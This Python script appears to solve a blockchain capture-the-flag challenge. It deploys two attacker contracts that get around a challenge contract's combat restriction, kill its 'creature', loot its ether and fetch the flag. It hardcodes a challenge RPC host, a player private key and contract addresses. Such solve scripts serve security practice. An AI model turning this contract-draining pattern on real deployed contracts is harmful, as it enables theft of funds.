#!/usr/bin/env python3
from web3 import Web3
from solcx import compile_source, install_solc
import json

# Connection info
RPC_URL = "http://94.237.57.211:55233/rpc"
PRIVATE_KEY = "0xbf800ea6af7210d1edf2b480ab2f4ed5997cb853f12f14f016f680b85be0cdf4"
PLAYER_ADDRESS = "0xADa0dBFe52039F3e7A6D7586c35cEbeb0e179b3f"
TARGET_ADDRESS = "0xEd4c451e37cD8b6E6c4F9D53039cD5a3958fD31c"
SETUP_ADDRESS = "0xd73DcAC7758125Bd7979A92ff47F09c0e25d783E"

# Connect to blockchain
w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={'timeout': 15}))
print(f"[*] Connected: {w3.is_connected()}")
print(f"[*] Player Address: {PLAYER_ADDRESS}")
print(f"[*] Target Address: {TARGET_ADDRESS}")
print(f"[*] Setup Address: {SETUP_ADDRESS}")

# Get player balance
balance = w3.eth.get_balance(PLAYER_ADDRESS)
print(f"[*] Player Balance: {w3.from_wei(balance, 'ether')} ETH")

# Get target balance
target_balance = w3.eth.get_balance(TARGET_ADDRESS)
print(f"[*] Target Balance: {target_balance} wei")

# Attacker contracts
ATTACKER_SOURCE = '''
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICreature {
    function attack(uint256 _damage) external;
    function loot() external;
    function lifePoints() external view returns (uint256);
}

contract Attacker1 {
    ICreature public creature;
    
    constructor(address _creature) {
        creature = ICreature(_creature);
    }
    
    function attackCreature() external {
        creature.attack(0);
    }
}

contract Attacker2 {
    ICreature public creature;
    
    constructor(address _creature) {
        creature = ICreature(_creature);
    }
    
    function attackCreature(uint256 damage) external {
        creature.attack(damage);
    }
    
    function lootCreature() external {
        creature.loot();
    }
    
    receive() external payable {}
}
'''

print("\n[*] Installing solc 0.8.13...")
try:
    install_solc('0.8.13')
except:
    print("[!] Solc already installed or error installing")

print("[*] Compiling attacker contracts...")
compiled_sol = compile_source(
    ATTACKER_SOURCE,
    output_values=['abi', 'bin'],
    solc_version='0.8.13'
)

# Get contract interfaces
attacker1_interface = compiled_sol['<stdin>:Attacker1']
attacker2_interface = compiled_sol['<stdin>:Attacker2']

# Deploy Attacker1
print("\n[*] Deploying Attacker1...")
Attacker1 = w3.eth.contract(
    abi=attacker1_interface['abi'],
    bytecode=attacker1_interface['bin']
)

nonce = w3.eth.get_transaction_count(PLAYER_ADDRESS)
tx = Attacker1.constructor(TARGET_ADDRESS).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': nonce,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price
})

signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
print(f"[*] Transaction hash: {tx_hash.hex()}")

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
attacker1_address = tx_receipt.contractAddress
print(f"[+] Attacker1 deployed at: {attacker1_address}")

# Deploy Attacker2
print("\n[*] Deploying Attacker2...")
Attacker2 = w3.eth.contract(
    abi=attacker2_interface['abi'],
    bytecode=attacker2_interface['bin']
)

nonce = w3.eth.get_transaction_count(PLAYER_ADDRESS)
tx = Attacker2.constructor(TARGET_ADDRESS).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': nonce,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price
})

signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
print(f"[*] Transaction hash: {tx_hash.hex()}")

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
attacker2_address = tx_receipt.contractAddress
print(f"[+] Attacker2 deployed at: {attacker2_address}")

# Get contract instances
attacker1 = w3.eth.contract(address=attacker1_address, abi=attacker1_interface['abi'])
attacker2 = w3.eth.contract(address=attacker2_address, abi=attacker2_interface['abi'])

# Attack sequence
print("\n[*] Step 1: Attacker1 attacks to set aggro...")
nonce = w3.eth.get_transaction_count(PLAYER_ADDRESS)
tx = attacker1.functions.attackCreature().build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': nonce,
    'gas': 200000,
    'gasPrice': w3.eth.gas_price
})

signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
print(f"[+] Attacker1 attacked! Gas used: {tx_receipt.gasUsed}")

# Check creature life
creature_abi = [
    {"inputs":[],"name":"lifePoints","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"uint256","name":"_damage","type":"uint256"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"loot","outputs":[],"stateMutability":"nonpayable","type":"function"}
]
creature = w3.eth.contract(address=TARGET_ADDRESS, abi=creature_abi)
life = creature.functions.lifePoints().call()
print(f"[*] Creature life points: {life}")

print("\n[*] Step 2: Attacker2 attacks with 1000 damage to kill creature...")
nonce = w3.eth.get_transaction_count(PLAYER_ADDRESS)
tx = attacker2.functions.attackCreature(1000).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': nonce,
    'gas': 200000,
    'gasPrice': w3.eth.gas_price
})

signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
print(f"[+] Attacker2 attacked! Gas used: {tx_receipt.gasUsed}")

# Check creature life again
life = creature.functions.lifePoints().call()
print(f"[*] Creature life points: {life}")

if life == 0:
    print("\n[+] Creature is dead! Looting...")
    nonce = w3.eth.get_transaction_count(PLAYER_ADDRESS)
    tx = attacker2.functions.lootCreature().build_transaction({
        'from': PLAYER_ADDRESS,
        'nonce': nonce,
        'gas': 200000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
    print(f"[+] Looted! Gas used: {tx_receipt.gasUsed}")
    
    # Check target balance
    target_balance = w3.eth.get_balance(TARGET_ADDRESS)
    print(f"[*] Target Balance after loot: {target_balance} wei")
    
    # Check if solved
    setup_abi = [{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]
    setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
    is_solved = setup.functions.isSolved().call()
    
    if is_solved:
        print("\n[+] ✅ Challenge solved!")
        print("[*] Getting flag from web interface...")
        import requests
        resp = requests.get("http://94.237.57.211:55233/", timeout=10)
        print(resp.text[:500])
    else:
        print("\n[-] Challenge not solved yet")
else:
    print(f"\n[-] Creature still has {life} life points")
